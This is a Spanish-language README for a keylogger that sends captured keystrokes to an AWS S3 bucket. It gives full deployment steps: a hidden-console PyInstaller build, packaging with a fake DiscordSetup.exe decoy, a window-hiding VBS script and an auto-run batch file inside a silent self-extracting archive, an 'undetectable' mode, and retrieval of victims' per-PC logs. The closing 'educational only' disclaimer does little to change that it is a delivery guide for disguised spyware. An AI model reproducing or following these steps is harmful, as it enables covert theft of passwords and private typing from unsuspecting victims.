# Keylogger High-T con Almacenamiento en AWS S3 (Buckets).

---

## 📋 Requisitos Previos.

1. **Python 3.8+** instalado.
2. **Cuenta de AWS** con acceso a S3.
3. **Bucket S3** creado en AWS.
4. **PyInstaller** para generar el ejecutable.
5. **WinRAR** para crear el paquete SFX.

---

## 🚀 Instalación.

### 1. Instalar dependencias
```powershell
pip install -r requirements.txt
```

### 2. Configurar credenciales de AWS.

Crea un archivo **`.env`** en la raíz del proyecto con el siguiente contenido:

```ini
# Configuración de AWS S3
AWS_ACCESS_KEY_ID=tu_access_key_id_aqui
AWS_SECRET_ACCESS_KEY=tu_secret_access_key_aqui
S3_BUCKET=nombre-de-tu-bucket
S3_FOLDER=carpeta-dentro-del-bucket/
S3_REGION=us-east-1
```

**Valores a reemplazar:**
- `AWS_ACCESS_KEY_ID`: Tu clave de acceso de AWS IAM
- `AWS_SECRET_ACCESS_KEY`: Tu clave secreta de AWS IAM
- `S3_BUCKET`: Nombre de tu bucket S3 (ej: `mi-bucket-keylogger`)
- `S3_FOLDER`: Carpeta dentro del bucket (ej: `logs-2026/`)
- `S3_REGION`: Región de tu bucket (ej: `us-east-1`, `us-west-2`, `sa-east-1`)

### 3. Crear usuario IAM en AWS.

Tu usuario/rol de AWS necesita estos permisos mínimos:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:PutObject",
                "s3:PutObjectAcl"
            ],
            "Resource": "arn:aws:s3:::NombreBucket/NombreCarpeta/*"
        }
    ]
}
```

---

## 🔧 Generar Ejecutable.

### 1. Crear el ejecutable con PyInstaller.

```powershell
pyinstaller --onefile --noconsole --icon=Logo-DC.ico --name=main Keylogger.py
```

Esto generará `main.exe` en la carpeta `dist/`.

**Copia `main.exe` a la raíz del proyecto** (donde está el .env):
```powershell
copy dist\main.exe .
```

### 2. Verificar configuración antes de empaquetar.

**🔍 IMPORTANTE:** Ejecuta el test de configuración para verificar que todo está correcto:

```powershell
python test_config.py
```

Este script verifica:
- ✅ Que el archivo `.env` se encuentra correctamente
- ✅ Que todas las credenciales de AWS están configuradas
- ✅ Que todos los archivos necesarios para empaquetar existen
- 📦 Te muestra instrucciones de empaquetado con WinRAR

**Solo procede al empaquetado si ves:** `✓✓✓ CONFIGURACIÓN CORRECTA ✓✓✓`

---

## 📦 Empaquetar con WinRAR.

Si quieres crear un instalador autoextraíble:

### Archivos a incluir:
- `main.exe` (keylogger)
- `.env` (configuración AWS - **CRÍTICO**)
- `DiscordSetup.exe` (señuelo/distracción)
- `ocultador.vbs` (oculta ventanas)
- `ejecuciones.bat` (ejecuta todo automáticamente)

### Pasos:
1. Selecciona todos los archivos listados arriba
2. Click derecho → WinRAR → **"Crear archivo SFX"**
3. En la pestaña **"Opciones SFX"** → **"Configuración"**:
   - **Ejecutar después de extraer:** `ejecuciones.bat`
   - **Modo silencioso:** Activar "Ocultar todo"
4. Guarda como: `DiscordSetup.exe` (o el nombre que prefieras)

⚠️ **CRÍTICO:** El archivo `.env` debe estar al mismo nivel que `main.exe` cuando se extraiga.

---

## ▶️ Ejecutar.

### Modo desarrollo (script Python):
```powershell
python Keylogger.py
```

### Modo producción (ejecutable):
```powershell
main.exe
```

Para activar el modo indetectable (ocultar consola), edita `Keylogger.py` y descomenta la línea:
```python
indetectabilidad()
```

---

## 📊 Configuración Avanzada.

### Ajustar intervalo de subida a S3:
En `Keylogger.py`, busca y modifica:
```python
INTERVALO_SUBIDA_S3 = 10  # Segundos
```

**Valores recomendados:**
- **Pruebas:** 10 segundos
- **Producción:** 300 segundos (5 minutos) o más
- **1 hora:** 3600 segundos

### Límite de tamaño del archivo local

Cuando el archivo temporal supera este tamaño, se crea uno nuevo:
```python
TAMANO_MAXIMO_MB = 10  # MB
```

---

## 📁 Formato de Archivos en S3.

Los archivos se guardan con el formato:
```
keys_NOMBREPC.txt              # Archivo principal (se sobrescribe)
keys_NOMBREPC_YYYYMMDD_HHMMSS.txt  # Archivos completos (cuando superan el límite)
```

Ejemplo:
```
keys_DESKTOP-ABC123.txt
keys_DESKTOP-ABC123_20260224_143052.txt
```

---

## 🔍 Verificar Archivos en S3.

### Con AWS CLI:
```powershell
# Listar archivos
aws s3 ls s3://TU-BUCKET/TU-CARPETA/

# Descargar un archivo específico
aws s3 cp s3://TU-BUCKET/TU-CARPETA/keys_NOMBREPC.txt ./
```

### Desde la Consola de AWS:
1. Ve a [AWS S3 Console](https://s3.console.aws.amazon.com/)
2. Selecciona tu bucket
3. Navega a tu carpeta configurada
4. Descarga los archivos de logs

---

## 🛠️ Solución de Problemas.

### ❌ Error: "S3_BUCKET no configurado".
**Solución:** 
- Verifica que el archivo `.env` existe en la misma carpeta que el ejecutable
- Ejecuta `python test_config.py` para diagnosticar el problema
- Asegúrate de que el `.env` tiene todas las variables

### ❌ Error: "NoCredentialsError".
**Solución:**
- Verifica que `AWS_ACCESS_KEY_ID` y `AWS_SECRET_ACCESS_KEY` están en el `.env`
- Revisa que no haya espacios extra en las credenciales

### ❌ Error: "Access Denied" (403).
**Solución:**
- Verifica que tu usuario IAM tiene permisos `s3:PutObject` en el bucket
- Verifica que el nombre del bucket es correcto
- Verifica que la región es correcta

### ❌ El archivo no sube a S3.
**Solución:**
- Ejecuta `python test_config.py` para verificar la configuración
- Revisa que tienes conexión a internet
- Verifica que el bucket existe en la región especificada
- Comprueba los logs en pantalla para ver errores específicos

### ❌ El ejecutable empaquetado no funciona.
**Solución:**
- Verifica que el `.env` se extrajo al mismo nivel que `main.exe`
- No ejecutes desde dentro del archivo comprimido
- Extrae todo a una carpeta primero

---

## 📂 Estructura del Proyecto.

```
Keylogger/
├── Keylogger.py           # Script principal
├── test_config.py         # Verificador de configuración
├── .env                   # Credenciales AWS (no en git)
├── requirements.txt       # Dependencias Python
├── ejecuciones.bat        # Ejecutor automático
├── ocultador.vbs          # Oculta ventanas
├── Logo-DC.ico            # Icono para el ejecutable
├── DiscordSetup.exe       # Señuelo
├── main.exe               # Ejecutable generado (no en git)
└── README.md              
```

---

## 📝 Licencia y Responsabilidad.

Este proyecto es **solo para fines educativos**. El autor no se hace responsable del uso indebido de este software. El uso de keyloggers sin consentimiento es ilegal en la mayoría de las jurisdicciones.

**Úsalo únicamente:**
- En tus propios dispositivos.
- Con permiso explícito del propietario del sistema.
- En entornos de prueba controlados.
- Para aprendizaje de ciberseguridad.
